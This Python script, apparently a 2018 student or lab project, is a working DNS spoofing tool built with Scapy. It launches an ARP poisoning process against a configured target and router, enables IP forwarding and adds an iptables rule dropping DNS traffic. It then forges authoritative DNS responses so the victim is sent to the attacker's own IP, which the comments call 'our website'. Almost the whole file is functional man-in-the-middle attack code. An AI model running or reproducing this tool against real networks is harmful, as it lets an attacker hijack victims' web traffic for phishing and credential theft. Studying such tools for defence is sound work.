#!/usr/bin/python3

'''
File:		    dnsSpoofer.py

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this file is to read and intercept the packets and 
craft the packets, sending them back to the router and the target machine.
The packets sent to the target machine will ensure the target is being redirected
to our website rather than the html requested.
'''

import configparser, os, platform, sys, signal, multiprocessing, logging, time, argparse, arpSpoof
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR
import subprocess

info = 0

'''
Function:       configSectionMap(section)

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this function is to handle reading information from
the config file. We read the IPs and Mac addresses of target machine and router
and send them our updated packets using these information.
'''
def configSectionMap(section):
    dict = {}
    config = configparser.ConfigParser()
    config.read('arp.config')
    options = config.options(section)
    for option in options:
        dict[option] = config.get(section, option)
    return dict

'''
Function:       signalHandler(signal, frame)

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this function is to handle user exiting the program
with either a keyboard interruption or an exit of some sort. Upon exiting,
we ensure forwading is disabled. We also ensure firewall rules are flushed
and reset.
'''
def signalHandler(signal, frame):
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    #firewall = "iptables -A INPUT -p UDP --dport 53 -j DROP"
    #subprocess.Popen([firewall], shell=True, stdout=subprocess.PIPE)
    sys.exit(0)

'''
Function:       readPackets(packet)

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this function is to take the packet that was read in and 
parse it. We put the target ip to redirect the traffic coming from the router
to the target IP. We put our IP in there to ensure the victim is navigating 
to our website rather than the requested website.
'''


def readPackets(packet):
    global info
    if packet.haslayer(DNSQR) and packet[IP].src == info['tip']:
        packetResponse = (Ether()/IP(dst=packet[0][1].src, src=packet[0][1].dst)/\
                      UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                      DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                      an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=info['ip'])))
        sendp(packetResponse, count=1, verbose=0)
        print("Redirecting...")

'''
Function:       spoof()

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this function is to store all the config file information
such as the IPs and Macs of target and router. We then listen for incoming packets
and upon receiving a packet go to the readPacket function for packets to be parsed.
'''
def spoof():
    global info
    info = configSectionMap('ARP')
    arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof, args = (info['rip'], info['rmac'], info['tip'], info['tmac'], info['mac']))
    arpProcess.start()
    signal.signal(signal.SIGINT, signalHandler)
    sniffFilter="udp and port 53"
    sniff(filter=sniffFilter, prn=readPackets, count=0)
    signal.pause()
    arpProcess.terminate()
'''
Function:       main()

Programmer:     Yiaoping + Anthony

Date:           October 15th 2018

Notes: The purpose of this function is to start off the program and ensure
we forwarding is enabled by changing the ip_forward file to true. Because this 
was done in python, we implemented dropping all forwarding packets to ensure
the speed of the response would not affect our spoofing.
'''
def main():
    print("Spoofing started")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    firewall = "iptables -A INPUT -p UDP --dport 53 -j DROP"
    subprocess.Popen([firewall], shell=True, stdout=subprocess.PIPE)
    spoof()



if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print ('Finished')
